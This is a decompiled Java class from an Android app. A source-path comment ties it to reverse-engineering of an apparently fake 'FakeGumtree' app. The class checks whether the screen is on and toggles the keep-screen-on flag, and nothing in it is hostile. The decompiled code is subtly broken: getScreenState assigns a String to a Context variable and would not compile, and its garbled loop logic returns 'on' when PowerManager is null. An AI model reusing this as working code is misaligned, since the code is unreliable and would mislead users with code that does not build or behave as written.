package com.gumsis.checktls;

import android.app.Activity;
import android.content.Context;
import android.os.Build.VERSION;
import android.os.PowerManager;
import android.view.Window;

public class ScrTls
{
  public static String getScreenState(Context paramContext)
  {
    String str = "none";
    boolean bool;
    do
    {
      try
      {
        PowerManager localPowerManager = (PowerManager)paramContext.getSystemService("power");
        paramContext = str;
        if (localPowerManager == null) {
          break;
        }
        if (Build.VERSION.SDK_INT >= 20) {
          bool = localPowerManager.isInteractive();
        } else {
          bool = localPowerManager.isScreenOn();
        }
      }
      catch (Exception paramContext)
      {
        Print.e(paramContext.toString());
        return "none";
      }
      return "off";
    } while (!bool);
    paramContext = "on";
    return paramContext;
  }
  
  public static void scrOff(Activity paramActivity)
  {
    try
    {
      paramActivity.getWindow().clearFlags(128);
      return;
    }
    catch (Exception paramActivity)
    {
      Print.e(paramActivity.toString());
    }
  }
  
  public static void scrOn(Activity paramActivity)
  {
    try
    {
      paramActivity.getWindow().addFlags(128);
      return;
    }
    catch (Exception paramActivity)
    {
      Print.e(paramActivity.toString());
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/ScrTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */